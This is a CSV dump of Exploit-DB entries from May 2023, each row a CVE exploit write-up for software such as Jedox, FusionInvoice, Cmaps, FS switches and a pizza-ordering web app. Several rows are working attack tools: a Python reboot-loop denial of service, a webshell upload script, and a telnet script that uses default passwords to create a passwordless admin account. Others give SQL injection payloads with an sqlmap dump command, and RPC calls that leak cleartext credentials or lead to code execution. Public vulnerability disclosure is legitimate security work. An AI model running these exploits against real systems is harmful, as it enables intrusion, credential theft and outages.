CVE-2023-25439,2023-05-23,exploit db,"# Exploit Title: FusionInvoice 2023-1.0 - Stored XSS (Cross-Site Scripting) # Date: 2023-05-24 # Exploit Author: Andrea Intilangelo # Vendor Homepage: https://www.squarepiginteractive.com # Software Link: https://www.fusioninvoice.com/store # Version: 2023-1.0 # Tested on: Latest Version of Desktop Web Browsers (ATTOW: Firefox 113.0.1, Microsoft Edge 113.0.1774.50) # CVE: CVE-2023-25439 Description: A stored cross-site scripting (XSS) vulnerability in FusionInvoice 2023-1.0 (from Sqware Pig, LLC) allows attacker to execute arbitrary web scripts or HTML. Injecting persistent javascript code inside the title and/or description while creating a task/expense/project (and possibly others) it will be triggered once page gets loaded. Steps to reproduce: - Click on ""Expenses"", or ""Tasks"" and add (or edit an existing) one, - Insert a payload"
CVE-2022-2591,2023-05-13,exploit db,"# Exploit Title: FLEX 1080 < 1085 Web 1.6.0 - Denial of Service # Date: 2023-05-06 # Exploit Author: Mr Empy # Vendor Homepage: https://www.tem.ind.br/ # Software Link: https://www.tem.ind.br/?page=prod-detalhe&id=94 # Version: 1.6.0 # Tested on: Android # CVE ID: CVE-2022-2591 #!/usr/bin/env python3 import requests import re import argparse from colorama import Fore import time def main(): def banner(): print(''' [FLEX 1080 < 1085 Web 1.6.0 - Denial of Service] def reboot(): r = requests.get(f'http://{arguments.target}/sistema/flash/reboot') if 'Rebooting' in r.text: pass else: print(f'{Fore.LIGHTRED_EX}[-] {Fore.LIGHTWHITE_EX}O hardware não é vulnerável') quit() banner() print(f'{Fore.LIGHTBLUE_EX}[*] {Fore.LIGHTWHITE_EX} Iniciando o ataque') while True: try: reboot() print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.LIGHTWHITE_EX} Hardware derrubado com sucesso!') time.sleep(1) except: # print(f'{Fore.LIGHTRED_EX}[-] {Fore.LIGHTWHITE_EX}O hardware está inativo') pass if __name__ == '__main__': parser = argparse.ArgumentParser() parser.add_argument('-t','--target', action='store', help='Target', dest='target', required=True) arguments = parser.parse_args() try: main() except KeyError: quit()"
CVE-2023-29809,2023-05-05,exploit db,"# Exploit Title: Cmaps v8.0 - SQL injection - Date: 27.04.2023 - Exploit Author: Lucas Noki (0xPrototype) - Vendor Homepage: https://github.com/vogtmh - Software Link: https://github.com/vogtmh/cmaps - Version: 8.0 - Tested on: Mac, Windows, Linux - CVE : CVE-2023-29809 *Description:* The vulnerability found is an SQL injection. The `bookmap` parameter is vulnerable. When visiting the page: http://192.168.0.56/rest/booking/index.php?mode=list&bookmap=test we get the normal JSON response. However if a single quote gets appended to the value of the `bookmap` parameter we get an error message: ```html Warning : mysqli_num_rows() expects parameter 1 to be mysqli_result, bool given in /var/www/html/rest/booking/index.php on line 152 ``` Now if two single quotes get appended we get the normal response without an error. This confirms the opportunity for sql injection. To really prove the SQL injection we append the following payload: '-(select*from(select+sleep(2)+from+dual)a)--+ The page will sleep for two seconds. This confirms the SQL injection. *Steps to reproduce:* 1. Send the following payload to test the vulnerability: ```'-(select*from(select+sleep(2)+from+dual)a)--+``` 2. If the site slept for two seconds run the following sqlmap command to dump the whole database including the ldap credentials. ```shell python3 sqlmap.py -u ""http:// /rest/booking/index.php?mode=list&bookmap=test*"" --random-agent --level 5 --risk 3 --batch --timeout=10 --drop-set-cookie -o --dump Special thanks goes out to iCaotix who greatly helped me in getting the environment setup as well as debugging my payload. ## Request to the server: ## Response from the server: Look at the response time."
CVE-2022-47879,2023-05-05,exploit db,"# Exploit Title: Jedox 2022.4.2 - Code Execution via RPC Interfaces # Date: 28/04/2023 # Exploit Author: Team Syslifters / Christoph MAHRL, Aron MOLNAR, Patrick PIRKER and Michael WEDL # Vendor Homepage: https://jedox.com # Version: Jedox 2022.4 (22.4.2) and older # CVE : CVE-2022-47879 Introduction A Remote Code Execution (RCE) vulnerability in /be/rpc.php and /be/erpc.php allows remote authenticated users to load arbitrary PHP classes from the rtn directory and to execute its methods. To exploit this vulnerability, the attacker needs knowledge about loadable classes, their methods and arguments. Write-Up See [Docs Syslifters](https://docs.syslifters.com/) for a detailed write-up on how to exploit vulnerability. Proof of Concept 1) The `Studio::getUserCreds` function can be used to read the clear text credentials of the currently authenticated user. PATH: /be/rpc.php METHOD: POST BODY: ""Studio"", ""getUserCreds"" 2) Using function `conn::test_palo`, an outgoing HTTP connection can be initiated from the web server to an attacker controlled server (Specify HOST and PORT) with the authenticated user's credentials. This could leak cleartext credentials to an attacker. PATH: /be/rpc.php METHOD: POST BODY: ""conn"", ""test_palo"", true, null 3) The function `Studio::getExternURI` can be used to generate a URL with embedded username and encrypted password of the currently authenticated user. PATH: /be/rpc.php METHOD: POST BODY: ""Studio"", ""getExternURI"", 0, 0 ""flag"":1 4) List all available database connections via `conn::ls`: PATH: /be/rpc.php METHOD: POST BODY: ""conn"", ""ls"", null, false, true, ""type"", ""active"", ""description"" 5) Retrieve details of individual database connection (specify connection name via CONNECTION) including encrypted credentials using the Java RPC function `com.jedox.etl.mngr.Connection::getGlobalConnection`: PATH: /tc/rpc METHOD: POST BODY: ""com.jedox.etl.mngr.Connections"", ""getGlobalConnection"", 6) Some functions return credentials only in encrypted form. However, they can be decrypted by any user using `common::decrypt` (specify encrypted credentials via ENCRYPTEDCREDS): PATH: /be/rpc.php METHOD: POST BODY: ""common"", ""decrypt"", 7) Using `common::paloGet` it is possible to read arbitrary configuration parameters (specify config param via CONFIG. For example, the password of the SMTP server can be read with it (CONFIG: tasks.smtp.password): PATH: /be/rpc.php METHOD: POST BODY: ""common"", ""paloGet"", null, ""Config"", ""#_config"", ""config"" ""config"": [ true, true 8) The function `palo_mgmt::sess_list` can be used to retrieve a list of all active user sessions. The session information includes not only the username but also the user's IP address, information about the browser and other data. PATH: /be/rpc.php METHOD: POST BODY: ""palo_mgmt"", ""sess_list"", null 9) The function `palo_mgmt::lic_users_list` returns a list of all users stored in the system: PATH: /be/rpc.php METHOD: POST BODY: ""palo_mgmt"", ""lic_users_list"", ""0"""
CVE-2022-47875,2023-05-05,exploit db,"# Exploit Title: Jedox 2022.4.2 - Remote Code Execution via Directory Traversal # Date: 28/04/2023 # Exploit Author: Team Syslifters / Christoph MAHRL, Aron MOLNAR, Patrick PIRKER and Michael WEDL # Vendor Homepage: https://jedox.com # Version: Jedox 2022.4 (22.4.2) and older # CVE : CVE-2022-47875 Introduction A Directory Traversal vulnerability in /be/erpc.php allows remote authenticated users to execute arbitrary code. To exploit the vulnerability, the attacker must have the permissions to upload files. Write-Up See [Docs Syslifters](https://docs.syslifters.com/) for a detailed write-up on how to exploit vulnerability. Proof of Concept 1) This vulnerability can be exploited by first uploading a file using one of the existing file upload mechanisms (e.g. Import in Designer). When uploading a file, the web application returns the file system path in the JSON body of the HTTP response (look for `fspath`). 2) Upload a PHP file and note the file system path (`fspath`) 3) Get RCE via Directory Traversal PATH: /be/erpc.php?c=../../../../../fspath/of/uploaded/file/rce.php METHOD: POST"
CVE-2022-47877,2023-05-05,exploit db,"# Exploit Title: Jedox 2020.2.5 - Stored Cross-Site Scripting in Log-Module # Date: 28/04/2023 # Exploit Author: Team Syslifters / Christoph MAHRL, Aron MOLNAR, Patrick PIRKER and Michael WEDL # Vendor Homepage: https://jedox.com # Version: Jedox 2020.2 (20.2.5) and older # CVE : CVE-2022-47877 Introduction A Stored cross-site scripting vulnerability allows remote authenticated users to inject arbitrary web scripts or HTML in the logs page via the log module. To exploit the vulnerability, the attacker must append an XSS payload to the log message. Write-Up See [Docs Syslifters](https://docs.syslifters.com/) for a detailed write-up on how to exploit vulnerability. Proof of Concept 1) Store log entry with XSS payload: PATH: /ub/ccmd METHOD: POST BODY: ""log"", ""error"", 2) Trigger XSS payload by opening the Logs page and showing the respective log entry."
CVE-2022-47878,2023-05-05,exploit db,"# Exploit Title: Jedox 2020.2.5 - Remote Code Execution via Configurable Storage Path # Date: 28/04/2023 # Exploit Author: Team Syslifters / Christoph MAHRL, Aron MOLNAR, Patrick PIRKER and Michael WEDL # Vendor Homepage: https://jedox.com # Version: Jedox 2020.2 (20.2.5) and older # CVE : CVE-2022-47878 Introduction Incorrect input validation for the default storage path variable in the settings page allows remote, authenticated users to specify the location as web root directory. Consecutive file uploads can lead to the execution of arbitrary code. To exploit the vulnerability, the attacker sets the default storage path to the web root. Write-Up See [Docs Syslifters](https://docs.syslifters.com/) for a detailed write-up on how to exploit vulnerability. Proof of Concept 1) In the UI in the application settings page the default storage path can be set to any value. This path could be set as the webroot directory of the webserver e.g. /htdocs/app/docroot/. 2) Then any upload/import function can be used to upload a .php webshell file to the webroot. 3) Execute webshell from the webroot directory to obtain RCE."
CVE-2022-47876,2023-05-05,exploit db,"# Exploit Title: Jedox 2020.2.5 - Remote Code Execution via Executable Groovy-Scripts # Date: 28/04/2023 # Exploit Author: Syslifters - Christoph Mahrl, Aron Molnar, Patrick Pirker and Michael Wedl # Vendor Homepage: https://jedox.com # Version: Jedox 2020.2 (20.2.5) and older # CVE : CVE-2022-47876 Introduction Jedox Integrator allows remote authenticated users to create Jobs to execute arbitrary code via Groovy-scripts. To exploit the vulnerability, the attacker must be able to create a Groovy-Job in Integrator. Write-Up See [Docs Syslifters](https://docs.syslifters.com/) for a detailed write-up on how to exploit vulnerability. Proof of Concept 1) A user with appropriate permissions can create Groovy jobs in the Integrator with arbitrary script code. Run the following groovy script to execute `whoami`. The output of the command can be viewed in the logs: def sout = new StringBuilder(), serr = new StringBuilder() def proc = 'whoami'.execute() proc.consumeProcessOutput(sout, serr) proc.waitForOrKill(10000) LOG.error(sout.toString()); LOG.error(serr.toString());"
CVE-2022-47874,2023-05-05,exploit db,"# Exploit Title: Jedox 2020.2.5 - Disclosure of Database Credentials via Improper Access Controls # Date: 28/04/2023 # Exploit Author: Team Syslifters / Christoph MAHRL, Aron MOLNAR, Patrick PIRKER and Michael WEDL # Vendor Homepage: https://jedox.com # Version: Jedox 2020.2 (20.2.5) and older # CVE : CVE-2022-47874 Introduction Improper access controls in `/tc/rpc` allows remote authenticated users to view details of database connections via the class `com.jedox.etl.mngr.Connections` and the method `getGlobalConnection`. To exploit the vulnerability, the attacker must know the name of the database connection. Write-Up See [Docs Syslifters](https://docs.syslifters.com/) for a detailed write-up on how to exploit vulnerability. Proof of Concept 1) List all available database connections via `conn::ls` (see also: CVE-2022-47879): PATH: /be/rpc.php METHOD: POST BODY: ""conn"", ""ls"", null, false, true, ""type"", ""active"", ""description"" 2) Retrieve details of a database connection (specify connection name via CONNECTION) including encrypted credentials using the Java RPC function `com.jedox.etl.mngr.Connection::getGlobalConnection`: PATH: /tc/rpc METHOD: POST BODY: ""com.jedox.etl.mngr.Connections"", ""getGlobalConnection"","
CVE-2022-47880,2023-05-05,exploit db,"# Exploit Title: Jedox 2022.4.2 - Disclosure of Database Credentials via Connection Checks # Date: 28/04/2023 # Exploit Author: Team Syslifters / Christoph MAHRL, Aron MOLNAR, Patrick PIRKER and Michael WEDL # Vendor Homepage: https://jedox.com # Version: Jedox 2022.4 (22.4.2) and older # CVE : CVE-2022-47880 Introduction An information disclosure vulnerability in `/be/rpc.php` allows remote authenticated users with the appropriate permissions to modify database connections to disclose the clear text credentials via the `test connection` function. To exploit the vulnerability, the attacker must set the host of the database connection to a server under his control. Write-Up See [Docs Syslifters](https://docs.syslifters.com/) for a detailed write-up on how to exploit vulnerability. Proof of Concept 1) The host part of a database connection can be changed in the connections details in the UI. Set the Host to a server that you control. 2) Test the database connection. 3) The webserver initiates a connection to the server that you control. Use wireshark to capture network traffic and to ultimately extract the database credentials."
CVE-2023-2246,2023-05-05,exploit db,"# Exploit Title: Online Pizza Ordering System 1.0 - Unauthenticated File Upload # Date: 03/05/2023 # Exploit Author: URGAN # Vendor Homepage: https://www.sourcecodester.com/php/16166/online-pizza-ordering-system-php-free-source-code.html # Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/php-opos.zip # Version: v1.0 # Tested on: LAMP Fedora Server 27 (Twenty Seven) Apache/2.4.34 (Fedora) 10.2.19-MariaDB PHP 7.1.23 # CVE: CVE-2023-2246 #!/usr/bin/env python3 # coding: utf-8 import os import requests import argparse from bs4 import BeautifulSoup # command line arguments parser = argparse.ArgumentParser() parser.add_argument('-u', '--url', type=str, help='URL with http://') parser.add_argument('-p', '--payload', type=str, help='PHP webshell') args = parser.parse_args() # if no arguments are passed, ask the user for them if not (args.url and args.payload): args.url = input('Enter URL with http://: ') args.payload = input('Enter file path PHP webshell: ') # URL Variables url = args.url + '/admin/ajax.php?action=save_settings' img_url = args.url + '/assets/img/' filename = os.path.basename(args.payload) files = [ ('img',(filename,open(args.payload,'rb'),'application/octet-stream')) # send a POST request to the server resp_upl = requests.post(url, files = files) status_code = resp_upl.status_code if status_code == 200: print('[+] File uploaded') else: print(f'[-] Error {status_code}: {resp_upl.text}') raise SystemExit(f'[-] Script stopped due to error {status_code}.') # send a GET request to the server resp_find = requests.get(img_url) # Use BeautifulSoup to parse the page's HTML code soup = BeautifulSoup(resp_find.text, 'html.parser') # get all tags on a page links = soup.find_all('a') # list to store found files found_files = [] # we go through all the links and look for the desired file by its name for link in links: file_upl = link.get('href') if file_upl.endswith(filename): # uploaded file name print('[+] Uploaded file found:', file_upl) file_url = img_url + file_upl # get the full URL of your file found_files.append(file_url) # add the file to the list of found files # if the list is not empty, then display all found files if found_files: print('[+] Full URL of your file:') for file_url in found_files: print('[+] ' + file_url) else: print('[-] File not found')"
CVE-2023-25438,2023-05-02,exploit db,"# Exploit Title: MilleGPG5 5.9.2 (Gennaio 2023) - Local Privilege Escalation / Incorrect Access Control # Date: 2023-04-28 # Exploit Author: Andrea Intilangelo # Vendor Homepage: https://millegpg.it/ # Software Homepage: https://millegpg.it - https://millewin.it/prodotti/governo-clinico-3/ # Software Link: https://www.millegpg.it/download/MilleGPGInstall.exe # Version: 5.9.2 # Tested on: Microsoft Windows 10 Enterprise x64 22H2, build 19045.2913 # CVE: CVE-2023-25438 MilleGPG / MilleGPG5 also known as ""Governo Clinico 3"" Vendor: Millennium S.r.l. / Dedalus Group - Dedalus Italia S.p.a. / Genomedics S.r.l. Affected/tested version: MilleGPG5 5.9.2 Summary: Mille General Practice Governance (MilleGPG): an interactive tool to address an effective quality of care through the Italian general practice network. MilleGPG is an innovative IT support for the evaluation and optimization of patient care and intervention processes, complete with new features for the management of the COVID-19 vaccine campaign. It is An irreplaceable ""ally"" for the General Practitioner, also offering contextual access to the most authoritative scientific content and CME training. Vuln desc: The application is prone to insecure file/folder permissions on its default installation path, wrongly allowing some files to be modified by unprivileged users, malicious process and/or threat actor. Attacker can exploit the weakness abusing the ""write"" permission of the main application available to all users on the system or network. Details: Any low privileged user can elevate their privileges abusing files/folders that have incorrect permissions, e.g.: C:\Program Files\MilleGPG5\MilleGPG5.exe (main gui application) C:\Program Files\MilleGPG5\plugin\ (GPGCommand.exe, nginx and php files) C:\Program Files\MilleGPG5\k-platform\ (api and webapp files) such as BUILTIN\Users:(I)(OI)(CI)(R,W) and/or FILE_GENERIC_WRITE, FILE_WRITE_DATA and FILE_WRITE_EA"
CVE-2023-30350,2023-05-02,exploit db,"# Exploit Title: FS-S3900-24T4S Privilege Escalation # Date: 29/04/2023 # Exploit Author: Daniele Linguaglossa & Alberto Bruscino # Vendor Homepage: https://www.fs.com/ # Software Link: not available # Version: latest # Tested on: latest # CVE : CVE-2023-30350 import sys import telnetlib def exploit(args): print(args) if len(args) != 1: print(f""Usage: {sys.argv[0]} "") sys.exit(1) else: ip = args[0] try: with telnetlib.Telnet(ip, 23) as tn: try: tn.read_until(b""Username: "") tn.write(b""guest\r\n"") tn.read_until(b""Password: "") tn.write(b""guest\r\n"") tn.read_until(b"">"") tn.write(b""enable\r\n"") tn.read_until(b""Password: "") tn.write(b""super\r\n"") tn.read_until(b""#"") tn.write(b""configure terminal\r\n"") tn.read_until(b""(config)#"") tn.write(b""username admin nopassword\r\n"") tn.read_until(b""(config)#"") print( ""Exploit success, you can now login with username: admin and password: "") tn.close() except KeyboardInterrupt: print(""Exploit failed"") tn.close() except ConnectionRefusedError: print(""Connection refused"") if __name__ == ""__main__"": exploit(sys.argv[1:])"
CVE-2023-30330,2023-05-02,exploit db,"# Exploit Title: SoftExpert (SE) Suite v2.1.3 - Local File Inclusion # Date: 27-04-2023 # Exploit Author: Felipe Alcantara (Filiplain) # Vendor Homepage: https://www.softexpert.com/ # Version: 2.0 < 2.1.3 # Tested on: Kali Linux # CVE : CVE-2023-30330 # SE Suite versions tested: 2.0.15.31, 2.0.15.115 # https://github.com/Filiplain/LFI-to-RCE-SE-Suite-2.0 # https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30330 #!/bin/bash # Usage: ./lfi-"
CVE-2023-29983,2023-05-02,exploit db,"# Exploit Title: Companymaps V8.0 - Stored Cross Site Scripting (XSS) # Date: 27.04.2023 # Exploit Author: Lucas Noki (0xPrototype) # Vendor Homepage: https://github.com/vogtmh # Software Link: https://github.com/vogtmh/cmaps # Version: 8.0 # Tested on: Mac, Windows, Linux # CVE : CVE-2023-29983 *Steps to reproduce:* 1. Clone the repository and install the application 2. Send a maliciously crafted payload via the ""token"" parameter to the following endpoint: /rest/update/?token= 3. The payload used is: 4. Simply visiting the complete URL: http://IP/rest/update/?token=PAYLOAD is enough. 5. Login into the admin panel and go to the auditlog under: /admin/index.php?tab=auditlog 6. Check your collaborator server. You should have a request where the admins cookie is the value of the c parameter In a real world case you would need to wait for the admin to log into the application and open the auditlog tab. Special thanks goes out to iCaotix who greatly helped me in getting the environment setup as well as debugging my payload."
